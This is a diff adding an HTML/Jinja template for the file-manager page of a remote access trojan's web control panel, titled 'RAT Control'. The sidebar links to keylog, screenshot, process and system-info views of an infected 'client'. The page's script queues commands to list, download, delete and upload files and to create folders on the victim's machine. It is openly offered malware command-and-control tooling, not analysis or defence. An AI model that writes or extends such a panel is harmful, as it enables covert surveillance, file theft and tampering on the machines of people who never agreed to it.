@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Manager - {{ client_id[:16] }}...</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='dashboard.css') }}">
+    <style>
+        .file-browser {
+            background: #1a1a2e;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        
+        .path-bar {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 15px;
+            background: #252540;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .path-bar input {
+            flex: 1;
+            padding: 10px;
+            background: #1a1a2e;
+            border: 1px solid #2a2a3e;
+            border-radius: 5px;
+            color: white;
+        }
+        
+        .file-list {
+            display: grid;
+            gap: 10px;
+        }
+        
+        .file-item {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background: #252540;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .file-item:hover {
+            background: #2f2f50;
+            transform: translateX(5px);
+        }
+        
+        .file-icon {
+            font-size: 2em;
+            margin-right: 15px;
+        }
+        
+        .file-info {
+            flex: 1;
+        }
+        
+        .file-name {
+            font-weight: 600;
+            color: #00d9ff;
+            margin-bottom: 5px;
+        }
+        
+        .file-details {
+            font-size: 0.85em;
+            color: #a0a0b0;
+        }
+        
+        .file-actions {
+            display: flex;
+            gap: 8px;
+        }
+        
+        .upload-area {
+            border: 2px dashed #667eea;
+            border-radius: 10px;
+            padding: 30px;
+            text-align: center;
+            margin-bottom: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .upload-area:hover {
+            border-color: #764ba2;
+            background: #252540;
+        }
+        
+        .upload-area.dragover {
+            background: #252540;
+            border-color: #00ff88;
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <div class="logo">
+            <h2>🎯 RAT Control</h2>
+        </div>
+        <nav class="nav-menu">
+            <a href="/admin/dashboard" class="nav-item">
+                <span class="icon">🏠</span>
+                <span>Dashboard</span>
+            </a>
+            <a href="/admin/processes/{{ client_id }}" class="nav-item">
+                <span class="icon">⚙️</span>
+                <span>Processes</span>
+            </a>
+            <a href="/admin/files/{{ client_id }}" class="nav-item active">
+                <span class="icon">📁</span>
+                <span>Files</span>
+            </a>
+            <a href="/admin/keylogs/{{ client_id }}" class="nav-item">
+                <span class="icon">⌨️</span>
+                <span>Keylogs</span>
+            </a>
+            <a href="/admin/screenshot/{{ client_id }}" class="nav-item">
+                <span class="icon">📸</span>
+                <span>Screenshot</span>
+            </a>
+            <a href="/admin/system/{{ client_id }}" class="nav-item">
+                <span class="icon">ℹ️</span>
+                <span>System Info</span>
+            </a>
+        </nav>
+    </div>
+
+    <div class="main-content">
+        <header>
+            <h1>📁 File Manager</h1>
+            <div class="header-actions">
+                <button class="btn btn-primary" onclick="listDirectory()">🔄 Refresh</button>
+                <button class="btn btn-primary" onclick="showUploadDialog()">⬆️ Upload</button>
+                <button class="btn btn-primary" onclick="createDirectory()">📂 New Folder</button>
+                <a href="/admin/dashboard" class="btn btn-primary">⬅️ Back</a>
+            </div>
+        </header>
+
+        <div class="client-info" style="background: #1a1a2e; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
+            <strong>Client:</strong> {{ hostname }} ({{ username }}) - <span class="status-{{ 'online' if is_online else 'offline' }}">{{ '🟢 Online' if is_online else '🔴 Offline' }}</span>
+        </div>
+
+        <div class="file-browser">
+            <div class="path-bar">
+                <button class="btn btn-primary" onclick="goUp()">⬆️ Up</button>
+                <input type="text" id="currentPath" value="/" readonly>
+                <button class="btn btn-primary" onclick="listDirectory()">Go</button>
+            </div>
+
+            <div class="upload-area" id="uploadArea" style="display: none;">
+                <div style="font-size: 3em; margin-bottom: 15px;">📤</div>
+                <h3>Drop files here or click to upload</h3>
+                <input type="file" id="fileInput" style="display: none;" onchange="uploadFile()">
+            </div>
+
+            <div id="fileList">
+                <div class="loading">Loading files...</div>
+            </div>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='main.js') }}"></script>
+    <script>
+        const clientId = '{{ client_id }}';
+        let currentPath = '/';
+
+        async function listDirectory() {
+            const path = document.getElementById('currentPath').value;
+            try {
+                document.getElementById('fileList').innerHTML = '<div class="loading">Loading files...</div>';
+                
+                const cmdResponse = await fetch(`/admin/file/${clientId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'list_directory',
+                        data: {path: path}
+                    })
+                });
+                
+                const cmdData = await cmdResponse.json();
+                if (!cmdData.success) throw new Error('Failed to queue command');
+                
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                const resultResponse = await fetch(`/admin/command_result/${cmdData.command_id}`);
+                const resultData = await resultResponse.json();
+                
+                if (resultData.success && resultData.result) {
+                    displayFiles(resultData.result);
+                }
+            } catch (error) {
+                showNotification('Error listing directory: ' + error.message, 'error');
+            }
+        }
+
+        function displayFiles(files) {
+            if (!files || files.length === 0) {
+                document.getElementById('fileList').innerHTML = '<div class="loading">Empty directory</div>';
+                return;
+            }
+
+            let html = '<div class="file-list">';
+            
+            files.forEach(file => {
+                const icon = file.is_dir ? '📁' : '📄';
+                const size = file.is_dir ? 'Folder' : formatBytes(file.size || 0);
+                
+                html += `
+                    <div class="file-item" onclick="${file.is_dir ? `changeDirectory('${file.path}')` : ''}">
+                        <div class="file-icon">${icon}</div>
+                        <div class="file-info">
+                            <div class="file-name">${file.name}</div>
+                            <div class="file-details">${size} • Modified: ${file.modified || 'Unknown'}</div>
+                        </div>
+                        <div class="file-actions">
+                            ${!file.is_dir ? `<button class="btn-small btn-info" onclick="event.stopPropagation(); downloadFile('${file.path}')">Download</button>` : ''}
+                            <button class="btn-small btn-danger" onclick="event.stopPropagation(); deleteFile('${file.path}', '${file.name}')">Delete</button>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            html += '</div>';
+            document.getElementById('fileList').innerHTML = html;
+        }
+
+        function changeDirectory(path) {
+            currentPath = path;
+            document.getElementById('currentPath').value = path;
+            listDirectory();
+        }
+
+        function goUp() {
+            const path = document.getElementById('currentPath').value;
+            const parts = path.split('/').filter(p => p);
+            parts.pop();
+            currentPath = '/' + parts.join('/');
+            document.getElementById('currentPath').value = currentPath || '/';
+            listDirectory();
+        }
+
+        async function downloadFile(path) {
+            try {
+                const cmdResponse = await fetch(`/admin/file/${clientId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'download_file',
+                        data: {file_path: path}
+                    })
+                });
+                
+                const cmdData = await cmdResponse.json();
+                if (cmdData.success) {
+                    showNotification('Download requested. Check command results...', 'success');
+                }
+            } catch (error) {
+                showNotification('Error downloading file: ' + error.message, 'error');
+            }
+        }
+
+        async function deleteFile(path, name) {
+            if (!confirm(`Delete "${name}"?`)) return;
+            
+            try {
+                const cmdResponse = await fetch(`/admin/file/${clientId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'delete_file',
+                        data: {file_path: path}
+                    })
+                });
+                
+                const cmdData = await cmdResponse.json();
+                if (cmdData.success) {
+                    showNotification('File deleted', 'success');
+                    setTimeout(() => listDirectory(), 1500);
+                }
+            } catch (error) {
+                showNotification('Error deleting file: ' + error.message, 'error');
+            }
+        }
+
+        function showUploadDialog() {
+            const uploadArea = document.getElementById('uploadArea');
+            uploadArea.style.display = uploadArea.style.display === 'none' ? 'block' : 'none';
+        }
+
+        async function uploadFile() {
+            const fileInput = document.getElementById('fileInput');
+            const file = fileInput.files[0];
+            if (!file) return;
+
+            const reader = new FileReader();
+            reader.onload = async function(e) {
+                const content = btoa(e.target.result);
+                
+                try {
+                    const cmdResponse = await fetch(`/admin/file/${clientId}`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            action: 'upload_file',
+                            data: {
+                                destination_path: currentPath + '/' + file.name,
+                                content: content
+                            }
+                        })
+                    });
+                    
+                    const cmdData = await cmdResponse.json();
+                    if (cmdData.success) {
+                        showNotification('File uploaded', 'success');
+                        fileInput.value = '';
+                        showUploadDialog();
+                        setTimeout(() => listDirectory(), 1500);
+                    }
+                } catch (error) {
+                    showNotification('Error uploading file: ' + error.message, 'error');
+                }
+            };
+            reader.readAsBinaryString(file);
+        }
+
+        async function createDirectory() {
+            const dirName = prompt('Enter directory name:');
+            if (!dirName) return;
+            
+            try {
+                const cmdResponse = await fetch(`/admin/file/${clientId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'create_directory',
+                        data: {directory_path: currentPath + '/' + dirName}
+                    })
+                });
+                
+                const cmdData = await cmdResponse.json();
+                if (cmdData.success) {
+                    showNotification('Directory created', 'success');
+                    setTimeout(() => listDirectory(), 1500);
+                }
+            } catch (error) {
+                showNotification('Error creating directory: ' + error.message, 'error');
+            }
+        }
+
+        // Drag and drop
+        const uploadArea = document.getElementById('uploadArea');
+        uploadArea.addEventListener('click', () => document.getElementById('fileInput').click());
+        uploadArea.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            uploadArea.classList.add('dragover');
+        });
+        uploadArea.addEventListener('dragleave', () => {
+            uploadArea.classList.remove('dragover');
+        });
+        uploadArea.addEventListener('drop', (e) => {
+            e.preventDefault();
+            uploadArea.classList.remove('dragover');
+            document.getElementById('fileInput').files = e.dataTransfer.files;
+            uploadFile();
+        });
+
+        window.addEventListener('load', () => listDirectory());
+    </script>
+</body>
+</html>
